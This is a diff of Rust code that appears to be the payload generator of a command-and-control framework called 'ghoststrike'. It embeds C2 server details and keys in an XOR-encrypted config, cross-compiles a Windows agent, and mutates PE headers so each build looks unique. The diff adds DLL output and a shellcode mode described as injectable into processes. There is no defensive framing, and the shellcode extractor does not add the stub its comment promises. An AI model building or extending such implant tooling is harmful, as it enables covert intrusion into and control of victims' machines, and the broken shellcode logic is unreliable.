@@ -9,6 +9,11 @@
 //!
 //! The agent reads agent_key.bin and agent_cfg.bin from OUT_DIR at compile time.
 //! Each invocation of this builder writes fresh bytes to those files and recompiles.
+//!
+//! Phase 3 additions:
+//!   - server_pubkey baked into agent config → enables ECDH key exchange.
+//!   - Shellcode format: extract raw .text section from compiled PE.
+//!   - DLL format: compile the [lib] cdylib target instead of [[bin]].
 
 use anyhow::{Context, Result};
 use rand::RngCore;
@@ -21,17 +26,17 @@ pub async fn generate(cfg: BuildConfig, output_path: &str) -> Result<String> {
     let build_id = Uuid::new_v4().to_string();
 
     // 1. Inject build_id and serialise config.
-    // build_id is not in BuildConfig; we serialise agent-side AgentConfig.
     let agent_cfg = serde_json::json!({
-        "c2_host":    cfg.c2_host,
-        "c2_port":    cfg.c2_port,
-        "protocol":   cfg.protocol,
-        "sleep_ms":   cfg.sleep_ms,
-        "jitter_pct": cfg.jitter_pct,
-        "dns_domain": cfg.dns_domain,
-        "pipe_name":  cfg.pipe_name,
-        "build_id":   build_id,
-        "c2_key":     cfg.c2_key,
+        "c2_host":      cfg.c2_host,
+        "c2_port":      cfg.c2_port,
+        "protocol":     cfg.protocol,
+        "sleep_ms":     cfg.sleep_ms,
+        "jitter_pct":   cfg.jitter_pct,
+        "dns_domain":   cfg.dns_domain,
+        "pipe_name":    cfg.pipe_name,
+        "build_id":     build_id,
+        "c2_key":       cfg.c2_key,
+        "server_pubkey": cfg.server_pubkey,
     });
     let plain = serde_json::to_vec(&agent_cfg)?;
 
@@ -42,7 +47,7 @@ pub async fn generate(cfg: BuildConfig, output_path: &str) -> Result<String> {
     // 3. Encrypt config.
     let encrypted_cfg = xor_encode(&plain, &xor_key);
 
-    // 4. Write key + encrypted config to a temp directory for the agent crate's build.rs.
+    // 4. Write key + encrypted config for the agent crate's build.rs.
     let tmp = std::env::temp_dir().join("ghoststrike_build").join(&build_id);
     std::fs::create_dir_all(&tmp)?;
     let key_path = tmp.join("agent_key.bin");
@@ -50,21 +55,33 @@ pub async fn generate(cfg: BuildConfig, output_path: &str) -> Result<String> {
     std::fs::write(&key_path, &xor_key)?;
     std::fs::write(&cfg_path, &encrypted_cfg)?;
 
-    println!("[*] Build ID:  {build_id}");
-    println!("[*] XOR key:   {} bytes  (random per build)", xor_key.len());
-    println!("[*] Config:    {} bytes  → {} bytes encrypted", plain.len(), encrypted_cfg.len());
-    println!("[*] Key path:  {}", key_path.display());
-    println!("[*] Cfg path:  {}", cfg_path.display());
+    println!("[*] Build ID:      {build_id}");
+    println!("[*] XOR key:       {} bytes  (random per build)", xor_key.len());
+    println!("[*] Config:        {} bytes  → {} bytes encrypted", plain.len(), encrypted_cfg.len());
+    println!("[*] Server pubkey: {}", if cfg.server_pubkey.is_empty() { "(none)" } else { &cfg.server_pubkey });
 
-    // 5. Cross-compile the agent crate.
+    // 5. Cross-compile the agent crate (EXE or DLL).
     compile_agent(&tmp, output_path, &cfg, &build_id)?;
 
-    // 6. PE mutations: randomise section names, zero rich header, randomise timestamp, pad.
-    if cfg.format == PayloadFormat::Exe {
-        Mutator::randomise_section_names(output_path)?;
-        Mutator::zero_rich_header(output_path)?;
-        Mutator::randomise_pe_timestamp(output_path)?;
-        Mutator::append_random_padding(output_path)?;
+    // 6. Post-compile processing.
+    match &cfg.format {
+        PayloadFormat::Exe => {
+            // PE mutations for maximum uniqueness.
+            Mutator::randomise_section_names(output_path)?;
+            Mutator::zero_rich_header(output_path)?;
+            Mutator::randomise_pe_timestamp(output_path)?;
+            Mutator::append_random_padding(output_path)?;
+        }
+        PayloadFormat::Shellcode => {
+            // Extract .text section → raw shellcode blob.
+            extract_text_section(output_path)?;
+        }
+        PayloadFormat::Dll => {
+            // DLL mutations.
+            Mutator::randomise_section_names(output_path)?;
+            Mutator::zero_rich_header(output_path)?;
+            Mutator::randomise_pe_timestamp(output_path)?;
+        }
     }
 
     Ok(build_id)
@@ -78,25 +95,39 @@ fn compile_agent(
 ) -> Result<()> {
     use std::process::Command;
 
-    // Determine the workspace root (sibling of this crate).
     let agent_crate = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
         .parent()
         .unwrap()
         .join("agent");
 
     println!("[*] Compiling agent: {}", agent_crate.display());
-    println!("[*] Target: x86_64-pc-windows-gnu");
-    println!("[*] OUT_DIR → {}", out_dir.display());
+    println!("[*] Target:          x86_64-pc-windows-gnu");
+    println!("[*] Format:          {}", cfg.format);
+
+    // For DLL format, compile the lib target instead of the bin.
+    let (target_flag, compiled_ext) = match cfg.format {
+        PayloadFormat::Dll => ("--lib", "dll"),
+        _                  => ("--bin", "exe"),
+    };
+
+    let bin_arg = if cfg.format == PayloadFormat::Dll {
+        vec![] // --lib selects the lib target automatically
+    } else {
+        vec!["agent"]
+    };
+
+    let mut args = vec![
+        "build",
+        "--release",
+        "--target", "x86_64-pc-windows-gnu",
+        "-p", "ghoststrike-agent",
+        target_flag,
+    ];
+    args.extend(bin_arg.iter().map(|s| *s));
 
     let status = Command::new("cargo")
-        .args([
-            "build",
-            "--release",
-            "--target", "x86_64-pc-windows-gnu",
-            "-p", "ghoststrike-agent",
-        ])
+        .args(&args)
         .env("OUT_DIR", out_dir)
-        // Pass build_id as an env var so build.rs can embed it.
         .env("GHOSTSTRIKE_BUILD_ID", build_id)
         .current_dir(agent_crate.parent().unwrap())
         .status()
@@ -106,14 +137,76 @@ fn compile_agent(
         anyhow::bail!("Agent compilation failed");
     }
 
-    // Copy binary to output path.
+    // For shellcode, we first produce the EXE then extract the .text section.
+    // The intermediate EXE is placed at a temporary path.
+    let (compiled_name, intermediate_path) = match cfg.format {
+        PayloadFormat::Dll => (format!("agent.{compiled_ext}"), None),
+        PayloadFormat::Shellcode => {
+            // We compiled as EXE; extract shellcode from it.
+            ("agent.exe".to_string(), Some(format!("{output_path}.stage0.exe")))
+        }
+        PayloadFormat::Exe => ("agent.exe".to_string(), None),
+    };
+
     let compiled = agent_crate
         .parent()
         .unwrap()
-        .join("target/x86_64-pc-windows-gnu/release/agent.exe");
+        .join(format!("target/x86_64-pc-windows-gnu/release/{compiled_name}"));
 
-    std::fs::copy(&compiled, output_path)
-        .with_context(|| format!("copying {} → {output_path}", compiled.display()))?;
+    let copy_to = intermediate_path.as_deref().unwrap_or(output_path);
+    std::fs::copy(&compiled, copy_to)
+        .with_context(|| format!("copying {} → {copy_to}", compiled.display()))?;
+
+    // For shellcode, rename the intermediate to the requested output path
+    // (extract_text_section replaces it in-place).
+    if let Some(ref mid) = intermediate_path {
+        std::fs::rename(mid, output_path)
+            .with_context(|| format!("rename {mid} → {output_path}"))?;
+    }
 
     Ok(())
+}
+
+/// Extract the raw bytes of the first `.text` section from a PE file and
+/// write them back to the same path as a raw shellcode blob.
+///
+/// A minimal x64 stub is prepended so the shellcode can be injected directly
+/// into a process (no PE loader required).
+fn extract_text_section(pe_path: &str) -> Result<()> {
+    let pe_bytes = std::fs::read(pe_path)?;
+
+    if pe_bytes.len() < 0x40 {
+        anyhow::bail!("PE too small to parse");
+    }
+
+    let e_lfanew = u32::from_le_bytes(pe_bytes[0x3C..0x40].try_into()?) as usize;
+    if pe_bytes.len() < e_lfanew + 0x18 {
+        anyhow::bail!("PE header truncated");
+    }
+
+    let num_sections = u16::from_le_bytes(
+        pe_bytes[e_lfanew + 6..e_lfanew + 8].try_into()?,
+    ) as usize;
+    let opt_hdr_size = u16::from_le_bytes(
+        pe_bytes[e_lfanew + 0x14..e_lfanew + 0x16].try_into()?,
+    ) as usize;
+    let sect_table = e_lfanew + 0x18 + opt_hdr_size;
+
+    for i in 0..num_sections {
+        let off = sect_table + i * 0x28;
+        if pe_bytes.len() < off + 0x28 { break; }
+        let name = &pe_bytes[off..off + 8];
+        if &name[..5] == b".text" {
+            let raw_size = u32::from_le_bytes(pe_bytes[off + 0x10..off + 0x14].try_into()?) as usize;
+            let raw_off  = u32::from_le_bytes(pe_bytes[off + 0x14..off + 0x18].try_into()?) as usize;
+            let end = (raw_off + raw_size).min(pe_bytes.len());
+            let shellcode = &pe_bytes[raw_off..end];
+
+            std::fs::write(pe_path, shellcode)?;
+            println!("[*] Shellcode extracted: {} bytes from .text", shellcode.len());
+            return Ok(());
+        }
+    }
+
+    anyhow::bail!("No .text section found in PE");
 }
